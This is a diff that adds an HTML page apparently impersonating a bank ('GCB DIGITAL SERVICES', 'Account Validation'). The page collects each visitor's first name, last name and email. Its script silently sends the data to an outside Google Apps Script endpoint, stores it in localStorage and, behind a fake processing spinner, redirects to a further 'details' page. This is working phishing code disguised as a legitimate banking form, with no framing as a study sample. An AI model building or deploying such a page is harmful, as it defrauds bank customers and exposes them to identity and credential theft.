@@ -1,1 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>GCB Account Validation</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: #f9fafc;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      color: #333;
+    }
 
+    /* Header & Footer styled like button */
+    .header, footer {
+      background: #ffcc00;
+      color: #002147;
+      text-align: center;
+      padding: 18px;
+      border-radius: 50px;
+      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.2);
+      width: 90%;
+      max-width: 600px;
+      margin: 15px auto;
+      font-weight: bold;
+    }
+
+    .header h1 {
+      font-size: 22px;
+      margin: 0;
+    }
+
+    .header p {
+      font-size: 14px;
+      margin: 6px 0 0;
+      font-weight: normal;
+    }
+
+    .form-wrap {
+      background: #fff;
+      width: 90%;
+      max-width: 400px;
+      margin-top: 5px;
+      padding: 30px 25px;
+      border-radius: 12px;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.15);
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      font-weight: bold;
+      color: #002147;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 18px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      border-radius: 50px;
+      border: none;
+      background: #ffcc00;
+      color: #002147;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 16px;
+      transition: all 0.3s ease;
+      box-shadow: 0 3px 8px rgba(0,0,0,0.2);
+    }
+
+    button:hover {
+      background: #e6b800;
+      transform: scale(1.03);
+    }
+
+    footer {
+      font-size: 13px;
+      padding: 15px;
+      border-radius: 50px;
+      margin-top: auto;
+    }
+
+    /* Overlay */
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.45);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      color: white;
+      font-size: 18px;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.4s ease;
+    }
+    .overlay.active {
+      opacity: 1;
+      pointer-events: all;
+    }
+    .spinner {
+      border: 4px solid #fff;
+      border-top: 4px solid #ffcc00;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+    @keyframes spin {
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h1>GCB DIGITAL SERVICES</h1>
+    <p>Account Validation</p>
+  </div>
+
+  <div class="form-wrap" id="formContainer">
+    <form id="dataForm" autocomplete="off">
+      <label for="firstName">First Name</label>
+      <input id="firstName" name="firstName" type="text" placeholder="Enter your first name" required>
+      <label for="lastName">Last Name</label>
+      <input id="lastName" name="lastName" type="text" placeholder="Enter your last name" required>
+      <label for="email">Email</label>
+      <input id="email" name="email" type="email" placeholder="Enter your email address" required>
+      <button type="submit">CONTINUE →</button>
+    </form>
+  </div>
+
+  <footer>A Better Way to Bank</footer>
+
+  <div class="overlay" id="overlay">
+    <div class="spinner"></div>
+    Processing, please wait…
+  </div>
+
+  <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbxna9EgM4s8zbNQTkfzcHfADid6CE7MEMmXAAIX2RTU6YfT-GkHRxEIWPVa81Qt-oO0/exec";
+    const form = document.getElementById('dataForm');
+    const overlay = document.getElementById('overlay');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      overlay.classList.add('active');
+      const fd = new FormData(form);
+      const { firstName, lastName, email } = Object.fromEntries(fd.entries());
+      try {
+        await fetch(scriptURL, { method: 'POST', body: fd });
+        localStorage.setItem('firstName', firstName || '');
+        localStorage.setItem('lastName', lastName || '');
+        localStorage.setItem('email', email || '');
+        setTimeout(() => window.location.href = 'details.html', 1800);
+      } catch (err) {
+        overlay.classList.remove('active');
+        alert('Something went wrong. Please try again.');
+      }
+    });
+  </script>
+</body>
+</html>
